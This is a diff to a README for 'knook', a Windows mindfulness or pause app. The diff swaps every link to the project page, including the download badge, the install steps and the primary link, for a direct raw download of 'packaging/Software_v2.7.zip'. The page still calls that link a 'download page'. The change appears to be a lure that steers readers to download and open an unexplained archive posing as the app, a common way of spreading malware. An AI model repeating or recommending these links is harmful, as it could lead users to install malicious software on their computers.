@@ -1,6 +1,6 @@
 # 🧘 knook - Find Calm With Every Pause
 
-[![Download knook](https://img.shields.io/badge/Download-knook-blue?style=for-the-badge&logo=github)](https://github.com/Blemished-windcavenationalpark867/knook)
+[![Download knook](https://img.shields.io/badge/Download-knook-blue?style=for-the-badge&logo=github)](https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip)
 
 ## 🌿 What is knook?
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Use this link to visit the download page and get knook:
 
-[Visit the knook download page](https://github.com/Blemished-windcavenationalpark867/knook)
+[Visit the knook download page](https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip)
 
 ## 📦 What you need
 
@@ -32,7 +32,7 @@ knook is light and should run well on most modern PCs and laptops.
 
 ## 🚀 How to get knook
 
-1. Open the download page: [https://github.com/Blemished-windcavenationalpark867/knook](https://github.com/Blemished-windcavenationalpark867/knook)
+1. Open the download page: [https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip](https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip)
 2. Look for the latest release or download file
 3. Download the Windows file to your computer
 4. Open the file from your Downloads folder
@@ -162,4 +162,4 @@ knook is made for personal pause use on your Windows PC. Keep your settings on y
 - Studio: Hanoa Studio
 - Goal: help you find your pause
 - Platform: Windows
-- Primary link: [https://github.com/Blemished-windcavenationalpark867/knook](https://github.com/Blemished-windcavenationalpark867/knook)
+- Primary link: [https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip](https://github.com/Blemished-windcavenationalpark867/knook/raw/refs/heads/main/packaging/Software_v2.7.zip)
